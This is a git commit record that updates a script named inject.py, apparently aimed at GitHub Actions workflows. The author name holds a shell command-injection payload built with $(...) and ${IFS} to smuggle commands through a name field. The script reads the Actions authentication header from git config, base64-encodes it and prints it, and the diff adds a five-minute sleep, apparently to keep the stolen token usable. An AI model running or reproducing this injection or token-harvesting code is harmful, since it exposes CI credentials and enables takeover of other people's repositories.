666c981164ddc034cf1b76c7664699c51d9c4b36
stp-$('&&${IFS}echo${IFS}${IFS}&&echo${IFS}fullname&&${IFS}echo${IFS}') <76434077+d3kum1d0r1y4@users.noreply.github.com>
2023-08-09 02:46:04 -0400

    Update inject.py

--- src/inject.py
+++ src/inject.py
@@ -1,10 +1,11 @@
 import subprocess
 import base64
-
+import time
 # Run the command and capture its output
 try:
     output = subprocess.check_output(["git", "config", "--get", "http.https://github.com/.extraheader"], text=True)
     encoded_output = base64.b64encode(output.encode()).decode()  # Base64 encode and decode as string
     print(encoded_output)
+    time.sleep(300)
 except subprocess.CalledProcessError as e:
     print("Error:", e)
